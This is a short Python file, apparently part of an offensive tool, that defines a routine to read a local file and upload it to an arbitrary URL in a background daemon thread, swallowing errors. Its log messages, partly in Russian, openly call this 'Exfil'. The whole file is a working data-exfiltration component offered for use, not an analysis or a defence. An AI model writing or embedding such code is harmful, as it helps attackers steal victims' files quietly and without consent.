import threading
import requests
import os

def send_async(file_path: str, url: str):
    def task():
        try:
            if not os.path.exists(file_path):
                print(f"[!] Файл не найден: {file_path}")
                return
            with open(file_path, "rb") as f:
                r = requests.post(url, files={"file": (os.path.basename(file_path), f)}, timeout=45)
            print(f"[+] Exfil ответ: {r.status_code}")
        except Exception as e:
            print(f"[!] Exfil error: {e}")
    threading.Thread(target=task, daemon=True).start()